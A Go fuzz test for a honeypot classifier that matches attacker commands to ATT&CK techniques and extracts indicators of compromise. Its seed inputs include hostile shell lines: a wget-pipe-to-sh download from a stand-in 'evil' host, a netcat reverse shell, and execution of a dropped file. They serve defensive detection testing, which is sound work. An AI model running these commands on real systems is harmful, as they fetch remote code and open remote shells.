package intelligence

import (
	"context"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

// FuzzClassify drives the full classification path (ATT&CK matching + IOC
// extraction + TTP session update) with arbitrary attacker-controlled event
// fields. It must never panic and every emitted IOC must be well-formed.
func FuzzClassify(f *testing.F) {
	seeds := []struct{ cmd, user, ip, etype string }{
		{"wget http://evil/x.sh | sh", "root", "203.0.113.4", "command"},
		{"", "", "", ""},
		{"chmod 777 /tmp/x; ./x", "admin", "::1", "command"},
		{"\x00\xff\x00 nc -e /bin/sh 1.2.3.4 4444", "r", "999.999.999.999", "login_failed"},
		{"uname -a && cat /proc/cpuinfo", "ubuntu", "2001:db8::1", "command"},
	}
	for _, s := range seeds {
		f.Add(s.cmd, s.user, s.ip, s.etype)
	}

	loader := NewATTCKLoader(f.TempDir())
	loader.loadEmbedded()
	c := NewClassifier(loader, NewTTPBuilder(30*time.Minute))

	f.Fuzz(func(t *testing.T, cmd, user, ip, etype string) {
		ev := &database.Event{
			Honeypot:  "cowrie",
			EventType: etype,
			Command:   cmd,
			Username:  user,
			SourceIP:  ip,
			Timestamp: time.Now().UTC(),
		}
		iocs := c.Classify(context.Background(), ev) // must not panic
		for _, ioc := range iocs {
			if ioc == nil || ioc.Value == "" || ioc.ID == "" {
				t.Errorf("classifier emitted malformed IOC: %+v", ioc)
			}
		}
	})
}
